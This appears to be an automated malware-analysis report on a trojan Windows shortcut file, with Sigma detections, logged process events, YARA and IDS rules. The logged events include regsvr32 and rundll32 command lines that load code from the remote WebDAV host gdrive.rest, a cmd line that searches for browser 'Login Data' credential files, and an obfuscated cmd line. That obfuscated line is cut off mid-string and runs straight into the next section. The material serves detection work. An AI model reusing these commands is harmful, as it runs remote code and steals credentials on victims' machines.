sigma_analysis_results.rule_description: Detects REGSVR32.exe to execute DLL hosted on remote shares

sigma_analysis_results.rule_description:
Detects "svchost.exe" spawning "rundll32.exe" with command arguments like "C:\windows\system32\davclnt.dll,DavSetCookie".
This could be an indicator of exfiltration or use of WebDav to launch code (hosted on a WebDav server).

match_context.values: @{Hashes=MD5=EF3179D498793BF4234F708D3BE28633,SHA256=B53F3C0CD32D7F20849850768DA6431E5F876B7BFA61DB0AA0700B02873393FA,IMPHASH=4DB27267734D1576D75C991DC70F68AC; CurrentDirectory=C:\Windows\system32\; OriginalFileName=RUNDLL32.EXE; Product=Microsoft\xae Windows\xae Operating System; Description=Windows host process (Rundll32); EventID=1; ParentCommandLine=C:\Windows\system32\svchost.exe -k LocalService -p -s WebClient; CommandLine=rundll32.exe C:\Windows\system32\davclnt.dll,DavSetCookie gdrive.rest@8080 http://gdrive.rest:8080/api; FileVersion=10.0.19041.746 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\svchost.exe; IntegrityLevel=High; Image=C:\Windows\System32\rundll32.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: Unsigned DLL Loaded by Windows Utility
sigma_analysis_results.rule_description:
Detects windows utilities loading an unsigned or untrusted DLL.
Adversaries often abuse those programs to proxy execution of malicious code.

match_context.values: @{Hashes=SHA1=1C351AFE5DF078F313ADF5BE57E91C670161C73B,MD5=42D5D5A2510BE75758BE2F133634F3E1,SHA256=153CD5A005B553927A94CC7759A8909BD1B351407D8D036A1BF5FCF9EE83192E,IMPHASH=00000000000000000000000000000000; Product=TODO: <Product name>; SignatureStatus=Unavailable; ImageLoaded=\\gdrive.rest@8080\api\AdvancedWin.ocx; Description=TODO: <File description>; OriginalFileName=Rev.dll; FileVersion=1.0.0.1; EventID=7; Signed=false; Image=C:\Windows\System32\regsvr32.exe; Company=TODO: <Company name>}

sigma_analysis_results.rule_description: Detects a network connection initiated by "Regsvr32.exe"

match_context.values: @{SourceIsIpv6=false; DestinationPort=8082; Initiated=true; Protocol=tcp; SourceIp=172.16.1.4; DestinationIsIpv6=false; EventID=3; Image=C:\Windows\System32\regsvr32.exe; SourcePort=49737; DestinationIp=208.85.17.52}

@{SourceIsIpv6=false; DestinationPort=8082; Initiated=true; Protocol=tcp; SourceIp=192.168.2.9; DestinationIsIpv6=false; EventID=3; SourcePort=49816; Image=C:\Windows\system32\regsvr32.exe; DestinationIp=208.85.17.52}

sigma_analysis_results.rule_title: File And SubFolder Enumeration Via Dir Command
sigma_analysis_results.rule_description: Detects usage of the "dir" command part of Widows CMD with the "/S" command line flag in order to enumerate files in a specified directory and all subdirectories.

match_context.values: @{Hashes=MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18; CurrentDirectory=C:\Windows\system32\; OriginalFileName=Cmd.Exe; Product=Microsoft\xae Windows\xae Operating System; Description=Windows Command Processor; EventID=1; ParentCommandLine=regsvr32 /s /i \\gdrive.rest@8080\api\AdvancedWin.ocx; CommandLine=cmd /c dir "%%LocalAppData%%\Login Data" /s /b & dir "%%appdata%%\Login Data" /s /b; FileVersion=10.0.19041.746 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\regsvr32.exe; IntegrityLevel=High; Image=C:\Windows\System32\cmd.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: System Network Connections Discovery Via Net.EXE
sigma_analysis_results.rule_description: Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network.

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Windows\System32\; OriginalFileName=net.exe; Hashes=MD5=0BD94A338EEA5A4E1F2830AE326E6D19,SHA256=9F376759BCBCD705F726460FC4A7E2B07F310F52BAA73CAAAAA124FDDBDF993E,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07; Description=Net Command; FileVersion=10.0.19041.1 (WinBuild.160101.0800); ParentCommandLine="C:\Windows\System32\cmd.exe" /v /c "set "dx7Pk4ao=etsHugQZsUrCrzy" && call set "9fFj6F2i=!dx7Pk4ao:~2,1!et" && !9fFj6F2i! crowdsourced_yara_results.description: Identifies executable artefacts in shortcut (LNK) files.
crowdsourced_yara_results.author: @bartblaze

crowdsourced_yara_results.description: Identifies execution artefacts in shortcut (LNK) files.
crowdsourced_yara_results.author: @bartblaze

crowdsourced_yara_results.description: Identifies shortcut (LNK) file with a long relative path. Might be used in an attempt to hide the path.
crowdsourced_yara_results.author: @bartblaze

attributes.magic: MS Windows shortcut, Item id list present, Has Description string, Has Relative path, Has Working directory, Has command line arguments, Icon number=13, Archive, ctime=Thu Dec 31 23:59:59 1969, mtime=Thu Dec 31 23:59:59 1969, atime=Thu Dec 31 23:59:59 1969, length=0, window=hide

exiftool.Flags: IDList, Description, RelativePath, WorkingDir, CommandArgs, IconFile, Unicode, NoLinkInfo

threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.

crowdsourced_ids_results.rule_msg: POLICY-OTHER HTTP request by IPv4 address attempt
crowdsourced_ids_results.rule_raw: alert tcp any any -> any $HTTP_PORTS ( msg:"POLICY-OTHER HTTP request by IPv4 address attempt"; flow:to_server,established; http_header; content:"Host:",fast_pattern,nocase; pcre:"/^Host\x3a\s*(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9]?[0-9])\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9]?[0-9])\s*:?\s*\d*\s*$/ims"; service:http; reference:url,www.w3.org/Protocols/rfc2616/rfc2616-sec15.html; classtype:policy-violation; sid:50447; rev:1; )
alert ( gid:119; sid:279; rev:1; msg:"(http_inspect) invalid status line"; metadata: rule-type preproc; classtype:unknown;)

crowdsourced_ids_results.rule_msg: ET INFO LNK File Downloaded via HTTP
crowdsourced_ids_results.rule_raw: alert http $EXTERNAL_NET any -> $HOME_NET any (msg:"ET INFO LNK File Downloaded via HTTP"; flow:established,to_client; file_data; content:"|01 14 02 00 00 00 00 00 c0 00 00 00 00 00 00 46|"; fast_pattern; offset:4; depth:16; reference:url,learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/c3376b21-0931-45e4-b2fc-a48ac0e60d15; classtype:misc-activity; sid:2048508; rev:1; metadata:attack_target Client_Endpoint, created_at 2023_10_10, deployment Perimeter, deployment SSLDecrypt, performance_impact Low, confidence High, signature_severity Informational, updated_at 2023_10_10, reviewed_at 2023_10_10;)

crowdsourced_ids_results.rule_msg: ET HUNTING Successful PROPFIND Response for Application Media Type
crowdsourced_ids_results.rule_raw: alert http $EXTERNAL_NET any -> $HOME_NET any (msg:"ET HUNTING Successful PROPFIND Response for Application Media Type"; flow:established,to_client; flowbits:isset,ET.PROPFIND; http.stat_code; content:"207"; file.data; content:"|3d 22|DAV|3a 22 3e|"; content:"response>"; distance:0; content:"href>"; distance:0; content:":href>"; distance:0; content:"status>HTTP/1.1 200 OK"; content:"getcontenttype>application/"; fast_pattern; reference:url,iana.org/assignments/media-types/media-types.xhtml; reference:url,datatracker.ietf.org/doc/html/rfc4918#section-9.1; classtype:misc-activity; sid:2049438; rev:1; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, created_at 2023_11_30, deployment Perimeter, deployment SSLDecrypt, signature_severity Informational, updated_at 2023_11_30;)

crowdsourced_ids_results.rule_msg: INDICATOR-COMPROMISE png file attachment without matching file magic
crowdsourced_ids_results.rule_raw: alert tcp $EXTERNAL_NET $HTTP_PORTS -> $HOME_NET any ( msg:"INDICATOR-COMPROMISE png file attachment without matching file magic"; flow:to_client,established; http_header; content:"Content-Type: image/png"; pkt_data; content:!"|0D 0A 89|PNG"; metadata:policy max-detect-ips drop; service:http; classtype:misc-activity; sid:44416; rev:3; )
